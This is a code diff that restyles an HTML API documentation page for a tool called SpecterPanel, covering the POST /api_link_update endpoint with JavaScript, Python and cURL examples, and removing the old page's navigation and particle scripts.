-      <!-- 14. /api_link_update/<ID> -->
-      <section id="view_api_link_update" class="p-6 md:p-8 bg-gradient-to-br from-white/5 to-white/2 rounded-xl border border-white/10 shadow-lg backdrop-blur-md relative animate-[fadeInUp_0.6s_ease-out] before:absolute before:top-0 before:left-0 before:right-0 before:h-0.5 before:bg-gradient-to-r before:from-[#7bd389] before:to-[#5ac768] before:opacity-70">
-        <div class="flex flex-wrap items-center gap-4 mb-4">
-          <span class="bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] px-3 py-1.5 rounded-full text-xs font-bold uppercase tracking-wide shadow-[0_4px_12px_rgba(123,211,137,0.3)]">POST</span>
-          <h2 class="font-mono text-lg sm:text-xl text-white bg-black/30 px-4 py-2 rounded-lg border border-white/10 break-words max-w-full">/api_link_update/&lt;ID&gt;</h2>
+      <!-- 14. POST /api_link_update/<ID> -->
+      <section id="view_api_link_update" class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm scroll-mt-24">
+        <div class="flex flex-wrap items-center gap-3 mb-4">
+          <span class="px-3 py-1 rounded-full text-xs font-bold bg-indigo-100 text-indigo-700 dark:bg-indigo-900/50 dark:text-indigo-300">POST</span>
+          <code class="text-lg font-mono text-slate-800 dark:text-slate-200 break-all">/api_link_update/&lt;ID&gt;</code>
         </div>
-        <div class="endpoint-summary mb-5">
-          <p class="mb-3">Update an existing API link. Expects form data with the updated fields.</p>
-          <p class="text-sm p-3 bg-black/20 border-l-4 border-[#7bd389] rounded text-[#8b9bb5] break-words"><strong>Note:</strong> Requires valid session authentication.</p>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Parameters (POST Form)</h3>
-        <div class="overflow-x-auto">
-          <table class="w-full text-sm border-collapse bg-black/20 rounded-lg shadow-md">
-            <thead><tr class="border-b border-white/10 bg-gradient-to-r from-[#7bd389]/10 to-[#7bd389]/5"><th class="p-4">Name</th><th class="p-4">Type</th><th class="p-4">Required</th><th class="p-4">Description</th></tr></thead>
-            <tbody>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">target_name</td><td class="p-4">string</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">Target associated with the API link</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">link</td><td class="p-4">string</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">Updated URL or endpoint</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">action_type</td><td class="p-4">string</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">Updated HTTP method</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">ID</td><td class="p-4">string</td><td class="p-4">path</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">ID of the API link to update</td></tr>
-            </tbody>
-          </table>
-        </div>
-        <div class="code-toolbar flex flex-wrap justify-between items-center gap-4 mt-5">
-          <div class="tabs flex gap-1 bg-black/30 p-1 rounded-lg border border-white/10">
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition active bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] shadow-md" data-target="view_api_link_update-js">JavaScript</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="view_api_link_update-py">Python</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="view_api_link_update-curl">cURL</button>
+        <p class="text-slate-600 dark:text-slate-300 mb-4">Update an existing API link.</p>
+        <div class="mt-4">
+          <div class="flex gap-2 mb-2">
+            <button data-tab="js" data-parent="view_api_link_update" class="tab-btn-api px-3 py-1 text-sm rounded bg-indigo-600 text-white">JavaScript</button>
+            <button data-tab="py" data-parent="view_api_link_update" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">Python</button>
+            <button data-tab="curl" data-parent="view_api_link_update" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">cURL</button>
+            <button data-copy-target="view_api_link_update-js" class="copy-btn-api ml-auto px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 hover:bg-slate-300 dark:hover:bg-slate-600 transition">Copy</button>
           </div>
-          <button class="copy-btn flex items-center gap-2 px-4 py-2 bg-[#7bd389]/10 border border-[#7bd389]/30 rounded-lg text-[#7bd389] text-xs font-medium hover:bg-[#7bd389]/20 hover:-translate-y-0.5 hover:shadow-lg transition" data-copy-target="view_api_link_update-js">Copy</button>
+          <div data-code="js" id="view_api_link_update-js" class="code-block-api"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>const fd = new FormData();
+fd.append('target_name','demo_target');
+fd.append('link','http://updated.com/api');
+fd.append('action_type','POST');
+fetch('/api_link_update/link123', {method:'POST', credentials:'include', body:fd});</code></pre></div>
+          <div data-code="py" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>session.post('http://SERVER/api_link_update/link123', data={'target_name':'demo_target','link':'http://updated.com/api','action_type':'POST'})</code></pre></div>
+          <div data-code="curl" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>curl -b cookies.txt -X POST "http://SERVER/api_link_update/link123" -F "target_name=demo_target" -F "link=http://updated.com/api" -F "action_type=POST"</code></pre></div>
         </div>
-        <pre id="view_api_link_update-js" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">// JavaScript (fetch) - Form POST
-const fd = new FormData();
-fd.append('target_name','demo_target'); fd.append('link','http://updated.com/api'); fd.append('action_type','POST');
-fetch('/api_link_update/link123', {method:'POST', credentials:'include', body:fd})
-.then(()=>console.log('API link updated')).catch(e=>console.error(e));</pre>
-        <pre id="view_api_link_update-py" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># Python (requests) with session
-form = {'target_name':'demo_target','link':'http://updated.com/api','action_type':'POST'}
-try:
-    r = session.post('http://SERVER/api_link_update/link123', data=form)
-    print("API link updated")
-except Exception as e: print(e)</pre>
-        <pre id="view_api_link_update-curl" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># cURL
-curl -b cookies.txt -X POST "http://SERVER/api_link_update/link123" -F "target_name=demo_target" -F "link=http://updated.com/api" -F "action_type=POST"</pre>
       </section>
 
-      <!-- Footer -->
-      <footer class="text-[#8b9bb5] text-sm mt-10 pt-5 border-t border-white/10 text-center">
-        <p class="break-words">Generated for <strong class="text-[#7bd389]">SpecterPanel</strong>. Replace <code class="bg-[#7bd389]/10 text-[#7bd389] px-1.5 py-0.5 rounded border border-[#7bd389]/20 break-all">SERVER</code> with your server's base URL (e.g., <code class="bg-[#7bd389]/10 text-[#7bd389] px-1.5 py-0.5 rounded border border-[#7bd389]/20 break-all">https://panel.example.com</code>).</p>
-        <p class="mt-2 p-3 bg-black/20 border-l-4 border-[#7bd389] rounded text-[#8b9bb5] text-left break-words">Always handle API tokens securely and never expose them in client-side code.</p>
+      <footer class="text-center text-sm text-slate-500 dark:text-slate-400 border-t border-slate-200 dark:border-slate-800 pt-8 mt-8">
+        <p>Generated for <strong class="text-indigo-600 dark:text-indigo-400">SpecterPanel</strong>. Replace <code class="bg-slate-100 dark:bg-slate-800 px-1 rounded">SERVER</code> with your server's base URL.</p>
+        <p class="mt-2">Always handle API tokens securely and never expose them in client-side code.</p>
       </footer>
     </main>
   </div>
-
-  <!-- Scroll to top button -->
-  <button class="scroll-top fixed bottom-8 right-8 w-12 h-12 rounded-full bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] shadow-[0_8px_24px_rgba(123,211,137,0.3)] flex items-center justify-center opacity-0 transition-all duration-300 hover:-translate-y-1 hover:shadow-[0_12px_32px_rgba(123,211,137,0.3)] z-[100] font-bold" id="scrollTopBtn">
-    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-      <path d="M7 11L12 6L17 11M7 17L12 12L17 17"/>
-    </svg>
-  </button>
-
-  <!-- JavaScript (identical to original) -->
-  <script>
-    // Particle background
-    function createParticles() {
-      const particles = document.getElementById('particles');
-      const particleCount = 20;
-      for (let i = 0; i < particleCount; i++) {
-        const particle = document.createElement('div');
-        particle.className = 'particle absolute bg-[#7bd389] rounded-full opacity-[0.05] animate-[float_20s_infinite_linear]';
-        const size = Math.random() * 4 + 1;
-        const posX = Math.random() * 100;
-        const delay = Math.random() * 20;
-        const duration = Math.random() * 20 + 20;
-        particle.style.width = `${size}px`;
-        particle.style.height = `${size}px`;
-        particle.style.left = `${posX}%`;
-        particle.style.animationDelay = `${delay}s`;
-        particle.style.animationDuration = `${duration}s`;
-        particles.appendChild(particle);
-      }
-    }
-
-    // Mobile navigation
-    const mobileMenuBtn = document.getElementById('mobileMenuBtn');
-    const navCloseBtn = document.getElementById('navCloseBtn');
-    const sidebar = document.getElementById('sidebar');
-    const navOverlay = document.getElementById('navOverlay');
-
-    function openMobileNav() {
-      sidebar.classList.add('translate-x-0');
-      navOverlay.classList.remove('hidden');
-      navOverlay.classList.add('opacity-100');
-      mobileMenuBtn.classList.add('rotate-90');
-      document.body.style.overflow = 'hidden';
-    }
-    function closeMobileNav() {
-      sidebar.classList.remove('translate-x-0');
-      navOverlay.classList.add('hidden');
-      navOverlay.classList.remove('opacity-100');
-      mobileMenuBtn.classList.remove('rotate-90');
-      document.body.style.overflow = '';
-    }
-
-    mobileMenuBtn.addEventListener('click', (e) => {
-      e.stopPropagation();
-      sidebar.classList.contains('translate-x-0') ? closeMobileNav() : openMobileNav();
-    });
-    navCloseBtn.addEventListener('click', closeMobileNav);
-    navOverlay.addEventListener('click', closeMobileNav);
-    document.querySelectorAll('.nav-link').forEach(link => {
-      link.addEventListener('click', () => { if (window.innerWidth <= 768) closeMobileNav(); });
-    });
-    document.addEventListener('click', (e) => {
-      if (window.innerWidth <= 768 && sidebar.classList.contains('translate-x-0') && !sidebar.contains(e.target) && e.target !== mobileMenuBtn) closeMobileNav();
-    });
-    document.addEventListener('keydown', (e) => { if (e.key === 'Escape' && sidebar.classList.contains('translate-x-0')) closeMobileNav(); });
-    window.addEventListener('resize', () => { if (window.innerWidth > 768 && sidebar.classList.contains('translate-x-0')) closeMobileNav(); });
-
-    // Scroll to top
-    const scrollTopBtn = document.getElementById('scrollTopBtn');
-    window.addEventListener('scroll', () => {
-      window.pageYOffset > 300 ? scrollTopBtn.classList.add('opacity-100') : scrollTopBtn.classList.remove('opacity-100');
-    });
-    scrollTopBtn.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
-
-    // Tabs
-    document.querySelectorAll('.tab-btn').forEach(btn => {
-      btn.addEventListener('click', () => {
-        const parent = btn.closest('section');
-        const target = btn.dataset.target;
-        parent.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('bg-gradient-to-r', 'from-[#7bd389]', 'to-[#5ac768]', 'text-[#0b0f19]', 'shadow-md'));
-        btn.classList.add('bg-gradient-to-r', 'from-[#7bd389]', 'to-[#5ac768]', 'text-[#0b0f19]', 'shadow-md');
-        parent.querySelectorAll('pre.code').forEach(pre => pre.classList.add('hidden'));
-        const el = parent.querySelector('#' + target);
-        if (el) el.classList.remove('hidden');
-      });
-    });
-
-    // Copy button
-    document.querySelectorAll('.copy-btn').forEach(cb => {
-      cb.addEventListener('click', () => {
-        const targetId = cb.dataset.copyTarget;
-        const el = document.getElementById(targetId);
-        if (!el) return;
-        navigator.clipboard.writeText(el.innerText).then(() => {
-          const original = cb.innerHTML;
-          cb.innerHTML = '<svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"/></svg> Copied!';
-          setTimeout(() => { cb.innerHTML = original; }, 2000);
-        }).catch(() => alert('Copy failed. Please try again.'));
-      });
-    });
-
-    // Search
-    const searchInput = document.getElementById('searchInput');
-    const navLinks = document.querySelectorAll('.nav-link');
-    if (searchInput) {
-      searchInput.addEventListener('input', (e) => {
-        const term = e.target.value.toLowerCase();
-        navLinks.forEach(link => {
-          link.style.display = link.textContent.toLowerCase().includes(term) ? 'block' : 'none';
-        });
-      });
-    }
-
-    // Active nav highlight
-    const sections = document.querySelectorAll('section');
-    const navLinksArray = Array.from(document.querySelectorAll('.nav-link'));
-    window.addEventListener('scroll', () => {
-      let current = '';
-      sections.forEach(section => {
-        const top = section.offsetTop - 100;
-        if (pageYOffset >= top) current = section.getAttribute('id');
-      });
-      navLinksArray.forEach(link => {
-        link.classList.remove('border-l-4', 'border-[#7bd389]', 'bg-gradient-to-r', 'from-[#7bd389]/10', 'to-transparent');
-        if (link.getAttribute('href') === `#${current}`) {
-          link.classList.add('border-l-4', 'border-[#7bd389]', 'bg-gradient-to-r', 'from-[#7bd389]/10', 'to-transparent');
-        }
-      });
-    });
-
-    // Smooth scroll for anchor links
-    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-      anchor.addEventListener('click', function(e) {
-        e.preventDefault();
-        const target = document.querySelector(this.getAttribute('href'));
-        if (target) {
-          window.scrollTo({ top: target.offsetTop - 80, behavior: 'smooth' });
-          history.pushState ? history.pushState(null, null, this.getAttribute('href')) : (location.hash = this.getAttribute('href'));
-        }
-      });
-    });
-
-    // Initialize particles
-    createParticles();
-  </script>
-</body>
-</html>
+</div>
+{% endblock %}
